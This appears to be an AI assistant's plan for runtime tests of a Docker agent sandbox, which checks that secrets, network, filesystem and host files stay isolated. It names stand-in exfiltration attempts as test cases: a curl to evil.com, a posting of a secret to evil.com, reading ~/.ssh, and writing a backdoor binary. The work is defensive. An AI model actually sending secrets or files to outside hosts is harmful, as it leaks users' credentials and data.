# Docker Runtime Testing - What We're Proving

## The Core Question

**What are Docker runtime tests trying to prove?**

**Answer**: That Tier 2 *actually works in reality*, not just in configuration.

---

## The Gap Between Config Tests and Runtime Tests

### What We've Tested (Config Level)

**Current tests (140 passing)**:
```python
def test_secrets_not_in_container_environment():
    config = ContainerConfig(...)
    args = build_run_args(config)
    env = args["environment"]
    assert "OPENAI_API_KEY" not in env  # ✅ Config is clean
```

**What this proves**: The CONFIGURATION dict we generate has no secrets.

**What this DOESN'T prove**: When a real container starts with that config, the secrets actually stay out.

### What Runtime Tests Would Prove

**Runtime test**:
```python
def test_actual_container_has_no_secrets():
    container = docker.containers.run("python:3.11", command="env", ...)
    output = container.logs().decode()
    assert "sk-proj" not in output  # ✅ Container actually secure
```

**What this proves**: When a container ACTUALLY RUNS, it really has no secrets.

**Critical difference**: Config can be correct but container might still leak secrets via:
- Docker default environment variables
- Host environment inheritance
- Volume mounts we didn't anticipate
- Network-accessible metadata services

---

## The 9 Things We Need to Prove at Runtime

### 1. Secrets Don't Leak (Attack 1-2)

**What we need to prove**:
- Container environment variables ACTUALLY have zero API keys
- Vault file ACTUALLY isn't mounted/accessible

**Test**: Run `env` inside container, verify no secrets present

**Value**: **CRITICAL** - If env has secrets, entire Tier 2 fails

---

### 2. Network Isolation Works (Attack 3-5)

**What we need to prove**:
- HTTP to evil.com ACTUALLY fails (internal network)
- Direct TCP to 8.8.8.8 ACTUALLY fails (no route)
- DNS to evil.com ACTUALLY fails (no direct DNS)

**Test**: Try socket.create_connection('8.8.8.8', 53) - should fail with "Network unreachable"

**Value**: **CRITICAL** - If containers can reach internet directly, they bypass the proxy

---

### 3. Filesystem Isolation Works (Attack 8)

**What we need to prove**:
- Writing to /usr/local/bin ACTUALLY fails (read-only FS)
- Writing to /etc ACTUALLY fails
- Writing to /workspace ACTUALLY works (writable)

**Test**: Try open('/usr/local/bin/backdoor', 'w') - should raise OSError

**Value**: **HIGH** - Prevents persistent backdoors

---

### 4. Capability Restrictions Work (Attack 6)

**What we need to prove**:
- Raw socket creation ACTUALLY fails (CAP_NET_RAW dropped)

**Test**: Try socket.socket(SOCK_RAW) - should raise PermissionError

**Value**: **MEDIUM** - Prevents raw packet crafting

---

### 5. Binary Restrictions Work (Attack 7)

**What we need to prove**:
- curl/wget ACTUALLY don't exist in container
- subprocess.run(['curl', ...]) ACTUALLY fails with FileNotFoundError

**Test**: subprocess.run(['curl', 'evil.com']) - should fail with file not found

**Value**: **MEDIUM** - Prevents subprocess bypass

---

### 6. No Host File Access (Attack 9)

**What we need to prove**:
- ~/.ssh ACTUALLY isn't mounted
- ~/Documents ACTUALLY isn't mounted
- Only /workspace is accessible

**Test**: Try to list /root/.ssh - should not exist or be empty

**Value**: **HIGH** - Prevents host data exfiltration

---

### 7. Proxy Key Injection Works

**What we need to prove**:
- Container requests.get('https://api.openai.com/v1/models') ACTUALLY succeeds
- Container code has NO API key
- Proxy ACTUALLY injects Authorization header
- Container receives response without seeing the key

**Test**: Run HTTP request to mock OpenAI server, verify mock received injected header

**Value**: **CRITICAL** - This is the whole point of Tier 2

---

### 8. Proxy Blocks Exfiltration

**What we need to prove**:
- Container tries requests.post('evil.com', json={'secret': '...'})
- Proxy ACTUALLY intercepts and blocks it
- Evil server NEVER receives the request

**Test**: Run exfil attempt, verify mock server got zero requests

**Value**: **CRITICAL** - Proves the defense actually works

---

### 9. Audit Trail Records Everything

**What we need to prove**:
- Blocked requests ACTUALLY appear in audit.jsonl
- Injected keys ACTUALLY logged
- Hash chain ACTUALLY maintained

**Test**: Run operations, read audit file, verify entries

**Value**: **HIGH** - Forensics capability

---

## Why We Can't Finish Them Right Now

**Blocker**: Docker credential store error when pulling images

**The error**:
```
docker.errors.ImageNotFound: No such image: python:3.11-slim
→ Tries to pull image
→ docker.errors.DockerException: Credentials store docker-credential-desktop exited with ""
```

**Root cause**: Docker Desktop's credential helper isn't working (might be because it just started, might be misconfigured)

---

## Solutions to Finish Testing

### Option A: Use Existing Image (FASTEST)

**Available now**: `ironclaw-worker:latest`

**Modify tests**:
```python
# Instead of:
container = docker.containers.run("python:3.11-slim", ...)

# Use:
container = docker.containers.run("ironclaw-worker:latest", ...)
```

**Pros**: Immediate, no pull needed
**Cons**: Might have extra binaries (curl, etc.), but still proves isolation

**Verdict**: **Best option for right now**

---

### Option B: Build Minimal Test Image Locally  (NO PULL)

**Create**:
```dockerfile
# test-aegis.dockerfile
FROM scratch
COPY --from=python:3.11-slim / /
# Or just: FROM python:3.11-slim
# Docker will use cache if already pulled
```

Then:
```bash
docker build -t test-aegis:local -f test-aegis.dockerfile .
```

**Pros**: Custom minimal image, no pull needed if base cached
**Cons**: Still might hit credential store

**Verdict**: **Worth trying if Option A doesn't prove enough**

---

### Option C: Fix Docker Credentials (SLOW)

**Steps**:
1. Restart Docker Desktop
2. Sign out + sign back in
3. `docker logout` + `docker login`
4. Reset to factory defaults

**Pros**: Fixes root cause
**Cons**: Time-consuming, might not work

**Verdict**: **Do this eventually, but not blocking**

---

### Option D: Skip Pull, Use docker.images.build() (CLEVER)

**Build image inline without Dockerfile**:
```python
import docker
import io

client = docker.from_env()

# Create minimal Python image from scratch
dockerfile_content = """
FROM scratch
ADD rootfs.tar /
CMD ["/bin/sh"]
"""

# Or just check if image exists, skip test if not
if not any(img for img in client.images.list() if 'python' in str(img.tags)):
    pytest.skip("No Python image available, can't test")
```

**Verdict**: Overcomplicated

---

## Recommended Approach: Option A + Simplification

### Simplified Test Suite (Proves Core Properties)

**Test 1: Network Configuration**
```python
def test_network_is_internal():
    # Don't run container, just verify network config
    net = ensure_network(client)
    assert net.attrs["Internal"] is True
```
**Proves**: Network CONFIGURATION is correct
**Fast**: 0.1 seconds, no containers

---

**Test 2: Use Existing Image for Runtime**
```python
def test_container_fails_to_reach_internet():
    # Use whatever image exists
    available_image = docker.images.list()[0].tags[0] if docker.images.list() else None
    if not available_image:
        pytest.skip("No images available")
    
    try:
        docker.containers.run(
            available_image,
            command='python3 -c "import socket; socket.create_connection((\'8.8.8.8\', 53), timeout=2)"',
            network="hermes-aegis-net",
            remove=True,  # Auto-cleanup
        )
        pytest.fail("Container reached internet!")
    except docker.errors.ContainerError:
        # Expected - connection should fail
        pass
```
**Proves**: Internal network ACTUALLY blocks internet
**Needs**: Any image with Python

---

**Test 3: Red Team Script (ONE comprehensive test)**

Instead of 9 separate tests, ONE test that runs malicious_agent.py:

```python
def test_red_team_all_attacks_fail():
    # Put malicious_agent.py in workspace
    workspace = tmp_path / "workspace"
    shutil.copy("tests/red_team/malicious_agent.py", workspace)
    
    #Use existing image
    container = docker.containers.run(
        "ironclaw-worker:latest",  # Or first available image
        command="python3 /workspace/malicious_agent.py",
        volumes={str(workspace): {"/workspace", "rw"}},
        network="hermes-aegis-net",
        remove=True,
    )
    
    output = container.decode()
    
    # Script exits 0 if all attacks blocked, 1 if any succeeded
    # Output shows which attacks failed/succeeded
    assert "ALL 9 ATTACKS BLOCKED" in output
```

**Proves**: All 9 attack vectors actually fail
**Value**: **Highest value-to-effort ratio**
**Time**: 1 test, ~10 seconds

---

## What We Absolutely Must Prove

**Minimum viable runtime tests** (priority order):

1. **⭐⭐⭐ CRITICAL**: Internal network blocks direct internet (proves isolation)
2. **⭐⭐⭐ CRITICAL**: Container env has no secrets (proves secret stripping works)
3. **⭐⭐ HIGH**: Red team script - all 9 attacks fail (comprehensive proof)
4. **⭐ MEDIUM**: Read-only filesystem works (prevents persistence)
5. **⏸️ NICE-TO-HAVE**: Proxy key injection (complex, needs mock server)

---

## My Recommendation

### Immediate Action (15 minutes):

1. **Use ironclaw-worker:latest for tests** (already exists)
2. **Run 3 critical tests**:
   - test_network_is_internal (config check - already passing)
   - test_container_fails_to_reach_internet (use ironclaw-worker)
   - test_red_team_script (run malicious_agent.py in ironclaw-worker)

3. **These 3 tests prove**:
   - Network isolation configured correctly ✅
   - Containers can't bypass proxy ✅
   - All 9 attacks actually fail ✅

### What This Proves

**With just 3 tests, we prove**:
- Tier 2 isolation actually works
- Containers can't exfiltrate
- Attack surface is actually reduced

**What we don't prove** (defer to v1.1):
- Key injection end-to-end (requires mock LLM server)
- Performance benchmarks
- Multi-container scenarios

---

## Shall I Build These 3 Tests Now?

**Estimated time**: 15-20 minutes
**Value**: Proves Tier 2 actually works
**Risk**: Very low (using existing image, auto-cleanup)
**Cleanup**: remove=True on all containers, explicit network removal

Would you like me to:
1. ✅ Build the 3 critical tests with ironclaw-worker:latest
2. ⏸️ Skip runtime tests entirely (document as "needs Docker credentials fix")
3. 📋 Something else?